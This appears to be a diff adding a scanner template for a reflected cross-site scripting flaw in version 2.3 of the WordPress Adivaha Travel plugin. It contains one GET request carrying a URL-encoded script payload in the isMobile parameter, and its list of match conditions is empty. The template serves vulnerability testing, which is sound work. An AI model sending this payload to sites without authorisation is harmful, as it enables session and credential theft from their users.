@@ -1,0 +1,19 @@
+id: wp-adivaha-xss
+brief:
+    title: WordPress Adivaha Travel Plugin 2.3 - Cross-Site Scripting
+    by: r3Y3r53
+    level: medium
+    about: The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials
+    label:
+        - wordpress
+        - wp
+        - wp-plugin
+        - xss
+        - adivaha
+        - travel
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/mobile-app/v3/?pid=77A89299&isMobile=%20clq95%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3Elb1ra'
+      signs: []
